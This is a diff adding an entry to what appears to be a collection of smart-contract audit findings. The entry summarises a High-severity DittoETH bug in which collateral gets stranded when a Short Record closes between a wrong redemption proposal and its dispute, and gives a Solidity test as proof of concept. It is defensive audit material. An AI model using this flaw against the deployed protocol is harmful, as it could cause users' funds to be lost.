@@ -189,3 +189,62 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 3.[High] Closing a SR during a wrong redemption proposal leads to loss of funds
+
+### Collateral added closed SR by disputed Redemption
+
+- Summary: A vulnerability in the DittoETH protocol can lead to a loss of funds when closing a Short Record (SR) during a wrong redemption proposal. When a user creates a redemption proposal with the proposeRedemption function, they must provide a list of SRs with the lowest collateral ratios (CR) in ascending order. If the list is incorrect, anyone can dispute it using the disputeRedemption function. However, if an SR is closed (due to liquidation, exiting, or transfer) between proposing and disputing, its collateral is added to the closed SR and cannot be recovered.
+
+- Impact & Recommendation: Reopening closed SRs could resolve the issue but might be misused to avoid liquidations.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-dittoeth#h-06-closing-a-sr-during-a-wrong-redemption-proposal-leads-to-loss-of-funds) & [Report](https://code4rena.com/reports/2024-03-dittoeth)
+
+<details><summary>POC</summary>
+
+```solidity
+function test_dispute_on_non_existing_sr() public {
+    // setup shorts
+    makeShorts({singleShorter: true});
+    _setETH(1000 ether);
+    skip(1 hours);
+    STypes.ShortRecord memory sr1 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID);
+    STypes.ShortRecord memory sr2 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+1);
+    STypes.ShortRecord memory sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
+    uint256 cr1 = diamond.getCollateralRatio(asset, sr1);
+    uint256 cr2 = diamond.getCollateralRatio(asset, sr2);
+    uint256 cr3 = diamond.getCollateralRatio(asset, sr3);
+    // CRs are increasing
+    assertGt(cr2, cr1);
+    assertGt(cr3, cr2);
+    // user creates a wrong proposal
+    MTypes.ProposalInput[] memory proposalInputs =
+        makeProposalInputsForDispute({shortId1: C.SHORT_STARTING_ID + 1, shortId2: C.SHORT_STARTING_ID + 2});
+    address redeemer = receiver;
+    vm.prank(redeemer);
+    diamond.proposeRedemption(asset, proposalInputs, DEFAULT_AMOUNT * 3 / 2, MAX_REDEMPTION_FEE);
+    // on of the SRs in the proposal is closed
+    fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT / 2, extra);
+    exitShort(C.SHORT_STARTING_ID + 2, DEFAULT_AMOUNT / 2, DEFAULT_PRICE, sender);
+    // SR is now closed
+    sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
+    assertEq(uint(sr3.status), uint(SR.Closed));
+    uint88 collateralBefore = sr3.collateral;
+    // another user disputes the wrong proposal
+    address disputer = extra;
+    vm.prank(disputer);
+    diamond.disputeRedemption({
+        asset: asset,
+        redeemer: redeemer,
+        incorrectIndex: 0,
+        disputeShorter: sender,
+        disputeShortId: C.SHORT_STARTING_ID
+    });
+    // SR is still closed and collateral increased
+    sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
+    assertEq(uint(sr3.status), uint(SR.Closed));
+    assertGt(sr3.collateral, collateralBefore);
+}
+
+```
+
+</details>
